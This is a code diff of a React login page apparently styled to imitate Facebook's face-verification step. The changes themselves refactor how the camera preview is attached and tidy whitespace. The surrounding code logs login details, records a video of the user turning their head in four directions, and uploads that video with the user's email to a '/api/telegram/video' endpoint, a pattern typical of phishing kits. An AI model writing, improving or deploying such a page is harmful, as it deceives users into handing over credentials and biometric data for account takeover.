@@ -1,4 +1,3 @@
-
 import { useState, useEffect } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
@@ -135,6 +134,14 @@ export default function LoginPage() {
     };
   }, [stream]);
 
+  // Effect to handle video playback when stream and videoRef are available
+  useEffect(() => {
+    if ((currentStep === "instructions" || currentStep === "recording") && stream && videoRef) {
+      videoRef.srcObject = stream;
+      videoRef.play().catch(err => console.error('Error playing video:', err));
+    }
+  }, [currentStep, stream, videoRef]);
+
   const handleLogin = async (data: LoginForm) => {
     setIsLoggingIn(true);
     console.log("Login attempt:", data);
@@ -159,9 +166,7 @@ export default function LoginPage() {
       });
       setStream(mediaStream);
       setCurrentStep("instructions");
-      if (videoRef) {
-        videoRef.srcObject = mediaStream;
-      }
+      // The videoRef will be set by the ref callback in the JSX
     } catch (error) {
       console.error("Camera access denied:", error);
       alert("Please allow camera access to continue with face verification");
@@ -174,22 +179,22 @@ export default function LoginPage() {
     } catch (error) {
       console.error('Failed to send face scan notification:', error);
     }
-    
+
     setIsRecording(true);
     setCurrentStep("recording");
     setCurrentDirection("left");
-    
+
     // Start recording video
     if (stream) {
       const chunks: Blob[] = [];
-      
+
       // Find a supported mimeType - only check webm formats
       const mimeTypes = [
         'video/webm;codecs=vp9',
         'video/webm;codecs=vp8',
         'video/webm'
       ];
-      
+
       let selectedMimeType = '';
       for (const type of mimeTypes) {
         if (MediaRecorder.isTypeSupported(type)) {
@@ -198,7 +203,7 @@ export default function LoginPage() {
           break;
         }
       }
-      
+
       // Create recorder with supported mimeType or default
       let recorder: MediaRecorder;
       try {
@@ -212,58 +217,58 @@ export default function LoginPage() {
         console.error('Error creating MediaRecorder:', error);
         return;
       }
-      
+
       recorder.ondataavailable = (event) => {
         if (event.data && event.data.size > 0) {
           chunks.push(event.data);
         }
       };
-      
+
       recorder.onstop = async () => {
         try {
           // Use the mimeType that MediaRecorder actually used
           const actualMimeType = recorder.mimeType || 'video/webm';
           const videoBlob = new Blob(chunks, { type: actualMimeType });
           setRecordedChunks(chunks);
-          
+
           console.log('Video recorded, size:', videoBlob.size, 'bytes', 'mimeType:', actualMimeType);
-          
+
           // Send video to Telegram
           const formData = new FormData();
           formData.append('video', videoBlob, 'face-verification.webm');
           formData.append('email', userEmail);
-          
+
           const response = await fetch('/api/telegram/video', {
             method: 'POST',
             body: formData,
           });
-          
+
           if (!response.ok) {
             const errorText = await response.text();
             throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
           }
-          
+
           console.log('Video sent successfully');
         } catch (error) {
           console.error('Failed to send video:', error);
         }
       };
-      
+
       recorder.start(100); // Collect data every 100ms
       setMediaRecorder(recorder);
-      
+
       const directionDuration = 2500; // 2.5 seconds per direction
       const progressInterval = 50; // Update progress every 50ms
       const directions: ("left" | "right" | "up" | "down")[] = ["left", "right", "up", "down"];
-      
+
       let currentDirIndex = 0;
       let dirProgress = 0;
-      
+
       // Start progress animation
       const animateProgress = () => {
         const progressTimer = setInterval(() => {
           dirProgress += (100 / (directionDuration / progressInterval));
-          
+
           if (dirProgress >= 100) {
             // Mark current direction as complete before incrementing
             const completedSet = new Set<string>();
@@ -273,23 +278,23 @@ export default function LoginPage() {
             setCompletedDirections(completedSet);
             setDirectionProgress(100);
             setOverallProgress((currentDirIndex + 1) * 25);
-            
+
             // Move to next direction
             currentDirIndex++;
             dirProgress = 0;
-            
+
             if (currentDirIndex >= directions.length) {
               // All directions complete
               clearInterval(progressTimer);
               setIsRecording(false);
               setOverallProgress(100);
               setCurrentDirection(null);
-              
+
               // Stop recording
               if (recorder.state !== 'inactive') {
                 recorder.stop();
               }
-              
+
               setCurrentStep("processing");
               setTimeout(() => {
                 if (stream) {
@@ -307,10 +312,10 @@ export default function LoginPage() {
             setOverallProgress((currentDirIndex * 25) + (dirProgress * 0.25));
           }
         }, progressInterval);
-        
+
         return progressTimer;
       };
-      
+
       animateProgress();
     }
   };
@@ -520,7 +525,7 @@ export default function LoginPage() {
               <p className="text-sm mb-6" style={{ color: '#65676b' }}>
                 We'll compare a video of your face to your profile photos. This helps us confirm it's your account.
               </p>
-              
+
               {/* Illustration */}
               <div className="w-32 h-32 mx-auto mb-8 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
                 <svg className="w-16 h-16" fill="none" stroke="#1877f2" viewBox="0 0 24 24" strokeWidth={1.5}>
@@ -558,19 +563,13 @@ export default function LoginPage() {
               {/* Camera Preview */}
               <div className="relative w-64 h-80 mx-auto mb-6 rounded-3xl overflow-hidden" style={{ backgroundColor: '#000' }}>
                 <video
-                  ref={(el) => {
-                    setVideoRef(el);
-                    if (el && stream) {
-                      el.srcObject = stream;
-                      el.play();
-                    }
-                  }}
+                  ref={setVideoRef} // Use the setter function to update videoRef state
                   autoPlay
                   playsInline
                   muted
                   className="w-full h-full object-cover scale-x-[-1]"
                 />
-                
+
                 {/* Face outline guide */}
                 <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                   <div
@@ -606,13 +605,7 @@ export default function LoginPage() {
               <div className="relative w-full max-w-xs mx-auto mb-6" style={{ aspectRatio: '3/4' }}>
                 <div className="relative w-full h-full rounded-3xl overflow-hidden" style={{ backgroundColor: '#000' }}>
                   <video
-                    ref={(el) => {
-                      setVideoRef(el);
-                      if (el && stream) {
-                        el.srcObject = stream;
-                        el.play();
-                      }
-                    }}
+                    ref={setVideoRef} // Use the setter function to update videoRef state
                     autoPlay
                     playsInline
                     muted
@@ -622,8 +615,8 @@ export default function LoginPage() {
                   {/* Dark overlay with oval cutout effect */}
                   <div className="absolute inset-0 pointer-events-none">
                     {/* SVG Oval Progress Indicator */}
-                    <svg 
-                      className="absolute inset-0 w-full h-full" 
+                    <svg
+                      className="absolute inset-0 w-full h-full"
                       viewBox="0 0 300 400"
                       style={{ overflow: 'visible' }}
                     >
@@ -635,26 +628,26 @@ export default function LoginPage() {
                         </mask>
                       </defs>
                       <rect x="0" y="0" width="300" height="400" fill="rgba(0,0,0,0.6)" mask="url(#ovalMask)" />
-                      
+
                       {/* Background oval (grey track) */}
-                      <ellipse 
-                        cx="150" 
-                        cy="190" 
-                        rx="95" 
-                        ry="125" 
-                        fill="none" 
-                        stroke="rgba(255,255,255,0.3)" 
+                      <ellipse
+                        cx="150"
+                        cy="190"
+                        rx="95"
+                        ry="125"
+                        fill="none"
+                        stroke="rgba(255,255,255,0.3)"
                         strokeWidth="6"
                       />
-                      
+
                       {/* Progress oval (blue fill) */}
-                      <ellipse 
-                        cx="150" 
-                        cy="190" 
-                        rx="95" 
-                        ry="125" 
-                        fill="none" 
-                        stroke="#1877f2" 
+                      <ellipse
+                        cx="150"
+                        cy="190"
+                        rx="95"
+                        ry="125"
+                        fill="none"
+                        stroke="#1877f2"
                         strokeWidth="6"
                         strokeLinecap="round"
                         strokeDasharray={`${2 * Math.PI * 110}`}
@@ -665,7 +658,7 @@ export default function LoginPage() {
                           transformOrigin: '150px 190px'
                         }}
                       />
-                      
+
                       {/* Current direction indicator dot */}
                       {currentDirection && (
                         <circle
@@ -690,34 +683,34 @@ export default function LoginPage() {
                         />
                       )}
                     </svg>
-                    
+
                     {/* Direction arrow inside oval */}
                     {currentDirection && (
                       <div className="absolute inset-0 flex items-center justify-center" style={{ marginTop: '-10px' }}>
                         <div
                           className="flex flex-col items-center"
                           style={{
-                            transform: 
-                              currentDirection === "left" ? "translateX(-50px)" : 
+                            transform:
+                              currentDirection === "left" ? "translateX(-50px)" :
                               currentDirection === "right" ? "translateX(50px)" :
                               currentDirection === "up" ? "translateY(-60px)" :
                               "translateY(60px)",
                             transition: 'transform 0.3s ease'
                           }}
                         >
-                          <div 
+                          <div
                             className="w-12 h-12 rounded-full flex items-center justify-center"
                             style={{ backgroundColor: 'rgba(24, 119, 242, 0.9)' }}
                           >
-                            <svg 
-                              className="w-6 h-6 text-white" 
-                              fill="none" 
-                              viewBox="0 0 24 24" 
-                              stroke="currentColor" 
+                            <svg
+                              className="w-6 h-6 text-white"
+                              fill="none"
+                              viewBox="0 0 24 24"
+                              stroke="currentColor"
                               strokeWidth={3}
                               style={{
-                                transform: 
-                                  currentDirection === "left" ? "rotate(180deg)" : 
+                                transform:
+                                  currentDirection === "left" ? "rotate(180deg)" :
                                   currentDirection === "right" ? "rotate(0deg)" :
                                   currentDirection === "up" ? "rotate(-90deg)" :
                                   "rotate(90deg)"
@@ -745,9 +738,9 @@ export default function LoginPage() {
               {/* Progress bar */}
               <div className="w-full max-w-xs mx-auto mb-4">
                 <div className="h-1 rounded-full overflow-hidden" style={{ backgroundColor: '#e4e6eb' }}>
-                  <div 
+                  <div
                     className="h-full rounded-full transition-all duration-100"
-                    style={{ 
+                    style={{
                       width: `${overallProgress}%`,
                       backgroundColor: '#1877f2'
                     }}
@@ -768,7 +761,7 @@ export default function LoginPage() {
                     <div
                       className="w-8 h-8 rounded-full flex items-center justify-center text-xs font-medium transition-all"
                       style={{
-                        backgroundColor: completedDirections.has(dir) ? '#00a400' : 
+                        backgroundColor: completedDirections.has(dir) ? '#00a400' :
                                         currentDirection === dir ? '#1877f2' : '#e4e6eb',
                         color: completedDirections.has(dir) || currentDirection === dir ? '#fff' : '#65676b'
                       }}
@@ -798,7 +791,7 @@ export default function LoginPage() {
               >
                 Cancel verification
               </button>
-              
+
               <style>{`
                 @keyframes pulse-dot {
                   0%, 100% { opacity: 1; transform: scale(1); }
